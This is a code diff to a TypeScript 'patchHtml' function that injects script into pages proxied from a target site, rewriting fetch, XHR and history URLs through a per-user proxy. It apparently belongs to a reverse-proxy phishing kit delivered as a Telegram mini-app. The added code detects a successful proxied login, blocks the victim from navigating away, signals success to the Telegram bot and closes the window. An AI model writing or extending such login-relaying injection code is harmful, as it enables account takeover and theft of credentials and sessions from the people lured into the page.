@@ -47,14 +47,55 @@ function patchHtml(html: string, proxyBase: string, userId: string): string {
             return response;
         };
 
-        const _originalXHR = window.XMLHttpRequest.prototype.open;
+        const _originalXHROpen = window.XMLHttpRequest.prototype.open;
+        const _originalXHRSend = window.XMLHttpRequest.prototype.send;
+
         window.XMLHttpRequest.prototype.open = function(method, url, ...rest) {
             if (typeof url === 'string' && url.startsWith('/')) {
                 url = '${proxyBase}' + url;
             } else if (typeof url === 'string' && url.startsWith('${TARGET}')) {
                 url = url.replace('${TARGET}', '${proxyBase}');
             }
-            return _originalXHR.call(this, method, url, ...rest);
+            return _originalXHROpen.call(this, method, url, ...rest);
+        };
+
+        window.XMLHttpRequest.prototype.send = function(...args) {
+            this.addEventListener('load', function() {
+                try {
+                    const data = JSON.parse(this.responseText);
+                    if (data && data._proxy_success) {
+                        window.onbeforeunload = () => true;
+                        if (window.Telegram && window.Telegram.WebApp) {
+                            window.Telegram.WebApp.sendData(JSON.stringify({ success: true }));
+                            setTimeout(() => {
+                                window.onbeforeunload = null;
+                                window.Telegram.WebApp.close();
+                            }, 300);
+                        } else {
+                            document.body.innerHTML = '<h2>✅ Авторизация успешна!</h2>';
+                        }
+                    }
+                } catch(e) {}
+            });
+            return _originalXHRSend.apply(this, args);
+        };
+
+        const _pushState = history.pushState.bind(history);
+        history.pushState = function(state, title, url) {
+            if (window.onbeforeunload) return;
+            if (typeof url === 'string' && url.startsWith('/')) {
+                url = '${proxyBase}' + url;
+            }
+            return _pushState(state, title, url);
+        };
+
+        const _replaceState = history.replaceState.bind(history);
+        history.replaceState = function(state, title, url) {
+            if (window.onbeforeunload) return;
+            if (typeof url === 'string' && url.startsWith('/')) {
+                url = '${proxyBase}' + url;
+            }
+            return _replaceState(state, title, url);
         };
     </script>
 `;
